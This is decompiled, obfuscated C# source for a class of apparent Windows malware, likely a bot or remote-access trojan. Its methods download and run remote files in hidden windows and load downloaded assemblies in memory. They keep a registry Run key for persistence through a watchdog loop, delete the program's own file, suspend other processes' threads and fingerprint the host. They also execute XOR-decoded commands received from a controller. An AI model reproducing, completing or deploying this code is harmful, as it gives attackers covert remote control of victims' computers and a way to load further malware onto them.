using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

internal class Class11
{
	[CompilerGenerated]
	private sealed class Class12
	{
		public Assembly assembly_0;

		public void method_0()
		{
			Delegate140.smethod_0(Delegate139.smethod_0(assembly_0), null, null);
		}
	}

	private const string string_0 = "abcdefghijklmnopqrstuvwxyz";

	private static readonly Random random_0 = Delegate208.smethod_0();

	public static bool bool_0 = true;

	public static bool bool_1 = false;

	public static bool bool_2 = false;

	public static string string_1 = string.Empty;

	public static string smethod_0()
	{
		return Delegate80.smethod_0(new string[10]
		{
			Delegate70.smethod_7(),
			(string)_003CModule_003E.smethod_0(2906428125u),
			Delegate70.smethod_8(),
			(string)_003CModule_003E.smethod_0(2906428103u),
			Delegate70.smethod_9(),
			(string)_003CModule_003E.smethod_0(2906428152u),
			Delegate70.smethod_10(),
			Delegate70.smethod_11(),
			(string)_003CModule_003E.smethod_0(2906428105u),
			Class2.string_1
		});
	}

	public static string smethod_1()
	{
		try
		{
			DateTime value = Delegate141.smethod_0(Class2.string_0);
			if (Delegate142.smethod_0().Subtract(value).TotalHours > 1.0)
			{
				return "";
			}
			return (string)_003CModule_003E.smethod_0(852556251u);
		}
		catch
		{
			return "";
		}
	}

	public static string smethod_2()
	{
		string result = "";
		OperatingSystem object_ = Delegate143.smethod_0();
		if (Delegate144.smethod_0(object_) == PlatformID.Win32NT)
		{
			if (Delegate146.smethod_0(Delegate145.smethod_0(object_)) == 5)
			{
				switch (Delegate146.smethod_1(Delegate145.smethod_0(object_)))
				{
				case 0:
					result = (string)_003CModule_003E.smethod_0(18942283u);
					break;
				case 1:
					result = (string)_003CModule_003E.smethod_0(18942274u);
					break;
				case 2:
					result = (string)_003CModule_003E.smethod_0(18942297u);
					break;
				}
			}
			if (Delegate146.smethod_0(Delegate145.smethod_0(object_)) == 6)
			{
				switch (Delegate146.smethod_1(Delegate145.smethod_0(object_)))
				{
				case 0:
					result = (string)_003CModule_003E.smethod_0(18942289u);
					break;
				case 1:
					result = (string)_003CModule_003E.smethod_0(18942312u);
					break;
				case 2:
					result = (string)_003CModule_003E.smethod_0(18942311u);
					break;
				}
			}
		}
		if (Delegate63.smethod_1(result, ""))
		{
			result = (string)_003CModule_003E.smethod_0(18942274u);
		}
		return result;
	}

	public static string smethod_3()
	{
		if (Delegate60.smethod_0(Delegate69.smethod_0(Delegate68.smethod_0(Delegate66.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(2027124550u)), (string)_003CModule_003E.smethod_0(2027124369u))), (string)_003CModule_003E.smethod_0(2027124352u)))
		{
			return (string)_003CModule_003E.smethod_0(2027124360u);
		}
		return (string)_003CModule_003E.smethod_0(2027124471u);
	}

	public static string smethod_4()
	{
		if (Delegate149.smethod_0(Delegate148.smethod_0(Delegate147.smethod_0()), WindowsBuiltInRole.Administrator) ? true : false)
		{
			return (string)_003CModule_003E.smethod_0(925417963u);
		}
		return (string)_003CModule_003E.smethod_0(925417969u);
	}

	public static string smethod_5()
	{
		try
		{
			using WebClient object_ = Delegate150.smethod_0();
			string object_2 = Delegate151.smethod_0(object_, (string)_003CModule_003E.smethod_0(2489150911u));
			string[] array = Delegate152.smethod_0(object_2, new string[1] { (string)_003CModule_003E.smethod_0(2489150875u) }, StringSplitOptions.None);
			string_1 = array[0];
			if (Delegate88.smethod_0(array[1]) == 2 && Delegate63.smethod_0(array[1], (string)_003CModule_003E.smethod_0(2489150866u)))
			{
				return array[1];
			}
			return Delegate70.smethod_12();
		}
		catch
		{
			return Delegate70.smethod_12();
		}
	}

	public static string smethod_6()
	{
		return Delegate154.smethod_0(Delegate153.smethod_0());
	}

	public static string smethod_7(int int_0)
	{
		char[] array = new char[int_0];
		for (int i = 0; i < int_0; i++)
		{
			array[i] = Delegate156.smethod_0((string)_003CModule_003E.smethod_0(3145370617u), Delegate155.smethod_0(random_0, Delegate88.smethod_0((string)_003CModule_003E.smethod_0(3145370617u))));
		}
		return Delegate157.smethod_0(array);
	}

	public static string smethod_8(string string_2)
	{
		try
		{
			Assembly object_ = Delegate158.smethod_0(Delegate104.smethod_1(string_2));
			return Delegate160.smethod_0((string)_003CModule_003E.smethod_0(1474634430u), Delegate159.smethod_0(object_), (string)_003CModule_003E.smethod_0(1474634420u), Delegate77.smethod_0(Delegate159.smethod_1(object_), new char[1] { ',' })[0]);
		}
		catch
		{
			return (string)_003CModule_003E.smethod_0(1474634411u);
		}
	}

	public static string smethod_9(string string_2)
	{
		string text = "";
		FileStream fileStream = null;
		MD5CryptoServiceProvider object_ = Delegate161.smethod_0();
		try
		{
			fileStream = Delegate162.smethod_0(string_2);
			byte[] byte_ = Delegate163.smethod_0(object_, fileStream);
			Delegate164.smethod_0(fileStream);
			text = Delegate165.smethod_0(Delegate102.smethod_1(byte_), (string)_003CModule_003E.smethod_0(82280642u), "");
			Delegate164.smethod_1(fileStream);
			return Delegate133.smethod_0(text);
		}
		catch
		{
			return (string)_003CModule_003E.smethod_0(82280951u);
		}
	}

	private static FileStream smethod_10(string string_2)
	{
		return Delegate166.smethod_0(string_2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
	}

	public static void smethod_11(string string_2)
	{
		try
		{
			Delegate86.smethod_1(string_2);
			Delegate85.smethod_0(Class2.string_0, FileAttributes.Normal);
			bool_0 = false;
			Delegate73.smethod_0(Delegate167.smethod_0(), Delegate70.smethod_0());
			ProcessStartInfo processStartInfo = Delegate168.smethod_0();
			Delegate169.smethod_0(processStartInfo, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4242054399u), Class2.string_0));
			Delegate170.smethod_0(processStartInfo, ProcessWindowStyle.Hidden);
			Delegate171.smethod_0(processStartInfo, bool_0: true);
			Delegate169.smethod_1(processStartInfo, (string)_003CModule_003E.smethod_0(4242054342u));
			Delegate172.smethod_0(processStartInfo);
			Delegate82.smethod_3(0);
		}
		catch
		{
			Delegate82.smethod_3(0);
		}
	}

	public static RegistryKey smethod_12()
	{
		if (Delegate63.smethod_1(Delegate70.smethod_11(), (string)_003CModule_003E.smethod_0(1367609288u)))
		{
			return Delegate173.smethod_0(Registry.CurrentUser, (string)_003CModule_003E.smethod_0(1367607982u), bool_0: true);
		}
		try
		{
			Delegate174.smethod_0(Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(1367607982u), bool_0: true), Delegate70.smethod_0(), Class2.string_0);
			Class2.string_5 = (string)_003CModule_003E.smethod_0(1367609188u);
			return Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(1367607982u), bool_0: true);
		}
		catch
		{
			return Delegate173.smethod_0(Registry.CurrentUser, (string)_003CModule_003E.smethod_0(1367607982u), bool_0: true);
		}
	}

	public static void smethod_13()
	{
		while (bool_0)
		{
			try
			{
				if (Delegate63.smethod_0(Delegate69.smethod_0(Delegate68.smethod_0(Delegate167.smethod_0(), Delegate70.smethod_0())), Class2.string_0))
				{
					Delegate174.smethod_0(Delegate167.smethod_0(), Delegate70.smethod_0(), Class2.string_0);
				}
			}
			catch
			{
				Delegate174.smethod_0(Delegate167.smethod_0(), Delegate70.smethod_0(), Class2.string_0);
			}
			Delegate82.smethod_2(1000);
		}
	}

	public static string smethod_14(string string_2, string string_3, string string_4, bool bool_3)
	{
		string text = (string)_003CModule_003E.smethod_0(3542971678u);
		bool flag = false;
		bool flag2 = false;
		if (!Delegate60.smethod_0(string_2, (string)_003CModule_003E.smethod_0(3542971151u)) && !Delegate60.smethod_0(string_2, (string)_003CModule_003E.smethod_0(3542971163u)))
		{
			string_2 = Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3542971151u), string_2);
		}
		if (!Delegate175.smethod_0(string_3))
		{
			if (Delegate60.smethod_0(string_3, (string)_003CModule_003E.smethod_0(3542970752u)))
			{
				if (Delegate60.smethod_0(string_3, (string)_003CModule_003E.smethod_0(3542971156u)))
				{
					flag = true;
				}
				else if (Delegate60.smethod_0(string_3, (string)_003CModule_003E.smethod_0(3542971182u)) && !Delegate175.smethod_0(string_4))
				{
					flag2 = true;
				}
			}
			else
			{
				text = string_3;
			}
		}
		try
		{
			string result = Delegate160.smethod_0(Delegate59.smethod_0(text), (string)_003CModule_003E.smethod_0(3542971168u), Delegate103.smethod_0(6), (string)_003CModule_003E.smethod_0(3542971194u));
			if (flag)
			{
				using WebClient object_ = Delegate150.smethod_0();
				Class12 CS_0024_003C_003E8__locals0 = Delegate176.smethod_0();
				byte[] array = Delegate177.smethod_0(object_, string_2);
				CS_0024_003C_003E8__locals0.assembly_0 = Delegate158.smethod_0(array);
				Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
				{
					(string)_003CModule_003E.smethod_0(3542971187u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3542971861u), Delegate159.smethod_1(CS_0024_003C_003E8__locals0.assembly_0))),
					(string)_003CModule_003E.smethod_0(3542971243u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3542971861u), Delegate159.smethod_0(CS_0024_003C_003E8__locals0.assembly_0))),
					(string)_003CModule_003E.smethod_0(3542971258u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(3542971861u), array.Length)),
					(string)_003CModule_003E.smethod_0(3542971780u)
				}), Class14.string_4);
				Delegate115.smethod_1(Delegate113.smethod_0(delegate
				{
					Delegate140.smethod_0(Delegate139.smethod_0(CS_0024_003C_003E8__locals0.assembly_0), null, null);
				}));
			}
			else
			{
				using (WebClient object_2 = Delegate150.smethod_0())
				{
					Delegate178.smethod_0(object_2, string_2, result);
				}
				if (Delegate175.smethod_1(result))
				{
					if (flag2)
					{
						int num = Delegate78.smethod_0(string_4);
						using Process object_4 = Delegate62.smethod_1();
						FileInfo object_3 = Delegate179.smethod_0(result);
						Delegate169.smethod_1(Delegate180.smethod_0(object_4), result);
						if (bool_3)
						{
							Delegate170.smethod_0(Delegate180.smethod_0(object_4), ProcessWindowStyle.Hidden);
							Delegate171.smethod_0(Delegate180.smethod_0(object_4), bool_0: true);
						}
						Delegate181.smethod_0(object_4);
						Delegate64.smethod_3(Delegate80.smethod_0(new string[9]
						{
							(string)_003CModule_003E.smethod_0(3542971252u),
							Delegate59.smethod_1(result),
							(string)_003CModule_003E.smethod_0(3542971269u),
							Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(3542971861u), num)),
							(string)_003CModule_003E.smethod_0(3542971283u),
							Delegate59.smethod_1(Delegate59.smethod_3(result)),
							(string)_003CModule_003E.smethod_0(3542971300u),
							Delegate59.smethod_1(Delegate112.smethod_0((string)_003CModule_003E.smethod_0(3542971861u), Delegate182.smethod_0(object_3), (string)_003CModule_003E.smethod_0(3542971312u))),
							(string)_003CModule_003E.smethod_0(3542971780u)
						}), Class14.string_4);
						Delegate82.smethod_2(num * 1000);
						Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(3542971343u), Delegate59.smethod_1(result), (string)_003CModule_003E.smethod_0(3542971362u)), Delegate70.smethod_4());
						Delegate83.smethod_0(object_4);
						Delegate86.smethod_0(result);
					}
					else
					{
						using Process object_6 = Delegate62.smethod_1();
						FileInfo object_5 = Delegate179.smethod_0(result);
						Delegate169.smethod_1(Delegate180.smethod_0(object_6), result);
						if (bool_3)
						{
							Delegate170.smethod_0(Delegate180.smethod_0(object_6), ProcessWindowStyle.Hidden);
							Delegate171.smethod_0(Delegate180.smethod_0(object_6), bool_0: true);
						}
						Delegate181.smethod_0(object_6);
						Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
						{
							(string)_003CModule_003E.smethod_0(3542970902u),
							Delegate59.smethod_1(result),
							(string)_003CModule_003E.smethod_0(3542970918u),
							Delegate59.smethod_1(Delegate59.smethod_3(result)),
							(string)_003CModule_003E.smethod_0(3542971300u),
							Delegate59.smethod_1(Delegate112.smethod_0((string)_003CModule_003E.smethod_0(3542971861u), Delegate182.smethod_0(object_5), (string)_003CModule_003E.smethod_0(3542971312u))),
							(string)_003CModule_003E.smethod_0(3542971780u)
						}), Class14.string_4);
					}
				}
			}
			return result;
		}
		catch (Exception object_7)
		{
			string text2 = (string)_003CModule_003E.smethod_0(3542970928u);
			text2 = (Delegate60.smethod_0(Delegate183.smethod_0(object_7), (string)_003CModule_003E.smethod_0(3542970961u)) ? Delegate71.smethod_0(text2, Delegate59.smethod_1((string)_003CModule_003E.smethod_0(3542970985u))) : ((!Delegate60.smethod_0(Delegate183.smethod_0(object_7), (string)_003CModule_003E.smethod_0(3542970993u))) ? null : Delegate71.smethod_0(text2, Delegate59.smethod_1((string)_003CModule_003E.smethod_0(3542971017u)))));
			if (text2 != null)
			{
				Delegate64.smethod_3(Delegate71.smethod_0(text2, (string)_003CModule_003E.smethod_0(3542971780u)), Class14.string_4);
			}
			return (string)_003CModule_003E.smethod_0(3542970549u);
		}
	}

	public static void smethod_15(string string_2, string string_3)
	{
		try
		{
			string text = Delegate160.smethod_0(Delegate59.smethod_0((string)_003CModule_003E.smethod_0(2597075539u)), (string)_003CModule_003E.smethod_0(2597076077u), Delegate103.smethod_0(5), (string)_003CModule_003E.smethod_0(2597076087u));
			using WebClient object_ = Delegate150.smethod_0();
			Delegate178.smethod_0(object_, string_2, text);
			string string_4 = Delegate59.smethod_2(text);
			if (Delegate63.smethod_1(string_3, string_4))
			{
				if (Delegate63.smethod_1(Class2.string_3, string_4))
				{
					Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2597076441u), Delegate59.smethod_1(Delegate160.smethod_0((string)_003CModule_003E.smethod_0(2597075608u), Class2.string_3, (string)_003CModule_003E.smethod_0(2597076357u), string_4)), (string)_003CModule_003E.smethod_0(2597075657u)), Delegate70.smethod_4());
					return;
				}
				using (Process object_2 = Delegate62.smethod_1())
				{
					Delegate169.smethod_1(Delegate180.smethod_0(object_2), text);
					Delegate181.smethod_0(object_2);
				}
				Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2597076364u), Delegate59.smethod_1(Delegate160.smethod_0((string)_003CModule_003E.smethod_0(2597075608u), Class2.string_3, (string)_003CModule_003E.smethod_0(2597076972u), string_4)), (string)_003CModule_003E.smethod_0(2597075657u)), Delegate70.smethod_4());
				Delegate86.smethod_2((string)_003CModule_003E.smethod_0(2597076393u));
			}
			else
			{
				Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
				{
					(string)_003CModule_003E.smethod_0(2597076409u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2597075608u), string_3)),
					(string)_003CModule_003E.smethod_0(2597073495u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2597075608u), string_4)),
					(string)_003CModule_003E.smethod_0(2597075657u)
				}), Delegate70.smethod_4());
			}
		}
		catch
		{
		}
	}

	public static List<string> smethod_16()
	{
		List<string> list = new List<string>();
		int int_ = 20000;
		byte[] array = new byte[20000];
		Delegate184.smethod_0(array, out int_, bool_0: true, 2, Class28.Enum9.const_5, 0);
		int num = 0;
		int num2 = Delegate185.smethod_0(array[0]);
		num = 4;
		for (int i = 0; i < num2; i++)
		{
			Delegate185.smethod_0(array[num]);
			num += 4;
			Delegate69.smethod_0(Delegate124.smethod_0(Delegate186.smethod_0(array, ref num, bool_0: false)));
			IPEndPoint object_ = Delegate186.smethod_0(array, ref num, bool_0: true);
			int num3 = Delegate187.smethod_0(array, ref num);
			try
			{
				string object_2 = Delegate72.smethod_0(Delegate69.smethod_0(Delegate124.smethod_0(object_)), (string)_003CModule_003E.smethod_0(157657270u), Delegate188.smethod_0(object_).ToString());
				if (!Delegate60.smethod_0(Delegate77.smethod_0(object_2, new char[1] { ':' })[0], (string)_003CModule_003E.smethod_0(157655067u)) && !Delegate60.smethod_0(Delegate77.smethod_0(object_2, new char[1] { ':' })[0], (string)_003CModule_003E.smethod_0(157655079u)))
				{
					list.Add(Delegate72.smethod_0(object_2, (string)_003CModule_003E.smethod_0(157657270u), num3.ToString()));
				}
			}
			catch
			{
			}
		}
		return list;
	}

	private static int smethod_17(byte[] byte_0, ref int int_0)
	{
		int result = byte_0[int_0] + (byte_0[int_0 + 1] << 8) + (byte_0[int_0 + 2] << 16) + (byte_0[int_0 + 3] << 24);
		int_0 += 4;
		return result;
	}

	private static IPEndPoint smethod_18(byte[] byte_0, ref int int_0, bool bool_3)
	{
		long num = ((byte_0[int_0 + 3] << 24) | (byte_0[int_0 + 2] << 16) | (byte_0[int_0 + 1] << 8) | byte_0[int_0]) & 0xFFFFFFFFL;
		int_0 += 4;
		int num2 = 0;
		num2 = ((!bool_3 || num != 0L) ? ((byte_0[int_0] << 8) + byte_0[int_0 + 1] + (byte_0[int_0 + 2] << 24) + (byte_0[int_0 + 3] << 16)) : 0);
		int_0 += 4;
		return Delegate189.smethod_0(num, num2);
	}

	public static void smethod_19(int int_0)
	{
		using Process object_ = Delegate79.smethod_0(int_0);
		if (Delegate63.smethod_1(Delegate61.smethod_0(object_), string.Empty))
		{
			return;
		}
		IEnumerator enumerator = Delegate191.smethod_0(Delegate190.smethod_0(object_));
		try
		{
			while (enumerator.MoveNext())
			{
				ProcessThread object_2 = (ProcessThread)enumerator.Current;
				IntPtr intptr_ = Delegate193.smethod_0(Class28.Enum7.flag_1, bool_0: false, (uint)Delegate192.smethod_0(object_2));
				if (!Delegate194.smethod_0(intptr_, IntPtr.Zero))
				{
					Delegate195.smethod_0(intptr_);
					continue;
				}
				break;
			}
		}
		finally
		{
			IDisposable disposable = enumerator as IDisposable;
			if (disposable != null)
			{
				disposable.Dispose();
			}
		}
	}

	public static void smethod_20(int int_0)
	{
		using Process object_ = Delegate79.smethod_0(int_0);
		if (Delegate63.smethod_1(Delegate61.smethod_0(object_), string.Empty))
		{
			return;
		}
		IEnumerator enumerator = Delegate191.smethod_0(Delegate190.smethod_0(object_));
		try
		{
			while (enumerator.MoveNext())
			{
				ProcessThread object_2 = (ProcessThread)enumerator.Current;
				IntPtr intptr_ = Delegate193.smethod_0(Class28.Enum7.flag_1, bool_0: false, (uint)Delegate192.smethod_0(object_2));
				if (!Delegate194.smethod_0(intptr_, IntPtr.Zero))
				{
					Delegate196.smethod_0(intptr_);
					continue;
				}
				break;
			}
		}
		finally
		{
			IDisposable disposable = enumerator as IDisposable;
			if (disposable != null)
			{
				disposable.Dispose();
			}
		}
	}

	public static void smethod_21(string string_2)
	{
		try
		{
			string string_3 = "";
			string string_4 = "";
			string string_5 = "";
			string string_6 = "";
			string object_ = Delegate105.smethod_0(Delegate100.smethod_0(), Delegate104.smethod_0(string_2));
			string[] array = Delegate77.smethod_0(object_, new char[1] { '|' });
			string text = Delegate105.smethod_0(Delegate100.smethod_0(), Delegate104.smethod_0(array[0]));
			string object_2 = array[1];
			if (!Delegate63.smethod_1(object_2, Class2.string_10))
			{
				return;
			}
			int int_ = Delegate78.smethod_0(Delegate89.smethod_0(object_2, 5, 3));
			string object_3 = Delegate165.smethod_0(Delegate108.smethod_0(text, int_), (string)_003CModule_003E.smethod_0(976927020u), (string)_003CModule_003E.smethod_0(976925072u));
			string[] array2 = Delegate77.smethod_0(object_3, new char[1] { '|' });
			string[] array3 = array2;
			foreach (string object_4 in array3)
			{
				string[] array4 = Delegate77.smethod_0(object_4, new char[1] { ' ' });
				try
				{
					string_3 = array4[1];
					string_4 = array4[2];
					string_5 = array4[3];
					string_6 = array4[4];
				}
				catch
				{
				}
				Delegate197.smethod_0(array4[0], Class14.string_4, string_3, string_4, string_5, string_6, array4);
			}
		}
		catch
		{
		}
	}

	public static string smethod_22(string string_2, int int_0)
	{
		StringBuilder object_ = Delegate198.smethod_0(string_2);
		StringBuilder object_2 = Delegate199.smethod_0(Delegate88.smethod_0(string_2));
		for (int i = 0; i < Delegate88.smethod_0(string_2); i++)
		{
			char c = Delegate200.smethod_0(object_, i);
			c = (char)(c ^ int_0);
			Delegate201.smethod_0(object_2, c);
		}
		return Delegate69.smethod_0(object_2);
	}

	public static void smethod_23()
	{
		using Process object_ = Delegate62.smethod_1();
		Delegate169.smethod_1(Delegate180.smethod_0(object_), Delegate110.smethod_0(Environment.SpecialFolder.System, (string)_003CModule_003E.smethod_0(3221182118u)));
		Delegate169.smethod_0(Delegate180.smethod_0(object_), Delegate80.smethod_0(new string[5]
		{
			(string)_003CModule_003E.smethod_0(3221182169u),
			Class2.string_0,
			(string)_003CModule_003E.smethod_0(3221182186u),
			Class2.string_0,
			(string)_003CModule_003E.smethod_0(3221181958u)
		}));
		Delegate170.smethod_0(Delegate180.smethod_0(object_), ProcessWindowStyle.Hidden);
		Delegate171.smethod_0(Delegate180.smethod_0(object_), bool_0: true);
		Delegate181.smethod_0(object_);
	}

	public static string smethod_24()
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		string result = (string)_003CModule_003E.smethod_0(1090174159u);
		ManagementObjectSearcher val = Delegate202.smethod_0(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(1090174166u), Delegate70.smethod_13(), (string)_003CModule_003E.smethod_0(1090174175u)), (string)_003CModule_003E.smethod_0(1090174129u));
		try
		{
			ManagementObjectCollection object_ = Delegate203.smethod_0(val);
			ManagementObjectEnumerator val2 = Delegate204.smethod_0(object_);
			try
			{
				while (Delegate207.smethod_0(val2))
				{
					ManagementObject object_2 = (ManagementObject)Delegate205.smethod_0(val2);
					result = Delegate69.smethod_0(Delegate206.smethod_0(object_2, (string)_003CModule_003E.smethod_0(1090174098u)));
				}
				return result;
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static string smethod_25()
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		string result = (string)_003CModule_003E.smethod_0(1994914075u);
		ManagementObjectSearcher val = Delegate202.smethod_0(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(1994914050u), Delegate70.smethod_13(), (string)_003CModule_003E.smethod_0(1994914059u)), (string)_003CModule_003E.smethod_0(1994913974u));
		try
		{
			ManagementObjectCollection object_ = Delegate203.smethod_0(val);
			ManagementObjectEnumerator val2 = Delegate204.smethod_0(object_);
			try
			{
				while (Delegate207.smethod_0(val2))
				{
					ManagementObject object_2 = (ManagementObject)Delegate205.smethod_0(val2);
					result = Delegate69.smethod_0(Delegate206.smethod_0(object_2, (string)_003CModule_003E.smethod_0(1994914118u)));
				}
				return result;
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static void smethod_26(string string_2, string string_3)
	{
		if (!Delegate175.smethod_0(string_2) && !Delegate175.smethod_0(string_3))
		{
			Class2.string_6 = string_2;
			Class2.string_7 = string_3;
		}
		else
		{
			Class2.string_6 = Class2.string_1;
			Class2.string_7 = Delegate103.smethod_0(5);
		}
		try
		{
			if (!bool_1 && Delegate63.smethod_0(string_1, string.Empty))
			{
				Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2179032322u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2179034356u), string_1)), (string)_003CModule_003E.smethod_0(2179032440u)), Class14.string_4);
				try
				{
					Delegate65.smethod_7();
				}
				catch
				{
				}
				Thread object_ = Delegate113.smethod_0(Class19.smethod_2);
				Delegate114.smethod_0(object_, bool_0: true);
				Delegate115.smethod_0(object_);
				bool_1 = true;
				bool_2 = true;
			}
			else if (Class19.bool_0 && bool_2)
			{
				Delegate64.smethod_3(Delegate70.smethod_14(), Class14.string_4);
				Class19.bool_1 = true;
				bool_1 = true;
			}
		}
		catch
		{
		}
	}
}
